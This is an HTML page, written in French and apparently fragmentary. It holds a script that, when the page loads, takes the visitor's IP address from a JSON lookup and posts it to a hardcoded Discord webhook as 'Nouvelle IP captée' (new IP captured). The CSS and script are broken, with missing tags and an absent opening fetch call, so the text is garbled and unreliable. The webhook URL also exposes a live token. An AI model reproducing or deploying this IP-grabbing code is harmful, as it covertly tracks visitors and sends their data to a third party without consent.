<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">

  <style>
    body {
      background-color: #121212;
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
      display: flex;
      flex-direction: column;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    h1 { font-size: 6rem; }

      margin-top: 20px;
      padding: 10px 20px;
      background: #00bcd4;
      border: none;
      color: #121212;
      font-weight: bold;

      .then(res => res.json())
      .then(data => {
        const ip = data.ip;
        const webhook = "https://discord.com/api/webhooks/1361707861486600262/pkrM_Hf_AXpiRLh8iUItwQaZ5ehWtPCrQ-ObypKkzIjR6AFK6yXS_pM8xA64CgsUE4QP";

        fetch(webhook, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            content: `Nouvelle IP captée : ${ip}`
          })
        });
      });
  </script>

</html>
